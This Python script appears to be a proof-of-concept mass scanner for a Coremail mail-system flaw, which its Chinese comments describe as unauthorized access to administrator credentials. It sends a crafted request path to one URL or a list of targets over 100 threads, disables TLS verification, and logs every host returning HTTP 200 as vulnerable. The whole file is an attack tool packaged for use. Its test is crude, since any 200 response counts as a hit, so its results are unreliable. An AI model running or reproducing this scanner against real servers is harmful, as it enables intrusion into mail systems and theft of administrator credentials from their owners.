import sys,requests,time,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# 定义程序的横幅
def banner():
    test = """
███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝                                    
"""
    print(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="Coremail邮件系统 未授权访问获取管理员账密漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2'
    url = target + payload_url
    
    try:
        res = requests.get(url=url,timeout=5,verify=False)
        
        if res.status_code == 200:
            print(f"[+]该网站存在未授权访问获取管理员账密漏洞，url为{target}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在此漏洞，url为{target}")

    except Exception as e:
        print(f"[*]该网站无法访问，url为{target}")

# 程序入口点
if __name__ == '__main__':
    main()
